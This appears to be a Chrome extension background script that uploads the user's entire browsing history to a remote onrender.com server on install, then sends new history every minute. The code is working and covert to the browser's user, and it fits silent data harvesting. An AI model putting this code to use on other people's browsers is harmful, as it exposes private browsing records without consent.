// --- Function for the STARTUP sync: Fetches ALL history and sends it in batches ---
function fetchAllHistoryAndSend() {
  chrome.history.search({
    'text': '',        // Search for all text
    'startTime': 0,    // Start from the beginning of time
    'maxResults': 10000 // A large number to get a comprehensive history
  }, (historyItems) => {
    if (historyItems && historyItems.length > 0) {
      console.log(`Found ${historyItems.length} total history items. Sending in batches of 100...`);

      const batchSize = 100;
      const totalBatches = Math.ceil(historyItems.length / batchSize);

      // Loop through the results and send them in chunks
      for (let i = 0; i < historyItems.length; i += batchSize) {
        const batch = historyItems.slice(i, i + batchSize);
        const batchNum = (i / batchSize) + 1;
        
        console.log(`Sending batch ${batchNum} of ${totalBatches}...`);
        sendHistoryData(batch);
      }

    } else {
      console.log('No history found on startup.');
    }
  });
}

// --- Function for the RECURRING sync: Fetches only the last minute of history ---
function fetchAndSendHistory() {
  const oneMinuteAgo = Date.now() - 60000;

  chrome.history.search({
    'text': '',
    'startTime': oneMinuteAgo,
    'maxResults': 100
  }, (historyItems) => {
    if (historyItems && historyItems.length > 0) {
      console.log(`Found ${historyItems.length} new history items. Sending to server...`);
      sendHistoryData(historyItems);
    } else {
      console.log('No new history items to send in the last minute.');
    }
  });
}

// --- Function to send data to the Python server ---
function sendHistoryData(data) {
  const serverUrl = 'https://poke-winner.onrender.com/receive_history'

  fetch(serverUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify(data),
  })
  .then(response => {
    if (!response.ok) {
      throw new Error(`Server responded with status: ${response.status}`);
    }
    return response.json();
  })
  .then(result => {
    console.log('Success response from server:', result.message);
  })
  .catch(error => {
    console.error('Error sending data to Python server:', error);
  });
}


// --- Event Listeners ---

// This listener runs when the extension is first installed or updated.
chrome.runtime.onInstalled.addListener(() => {
  // 1. Create the alarm that will fire every minute for subsequent checks.
  chrome.alarms.create('historyTimer', {
    periodInMinutes: 1
  });
  console.log("History Sender alarm created.");

  // 2. Perform the initial FULL history sync immediately on load.
  console.log("Performing initial FULL history sync on load...");
  fetchAllHistoryAndSend();
});

// This listener runs every time the alarm goes off (every minute).
chrome.alarms.onAlarm.addListener((alarm) => {
  if (alarm.name === 'historyTimer') {
    console.log("Alarm triggered. Checking for new history from the last minute...");
    fetchAndSendHistory();
  }
});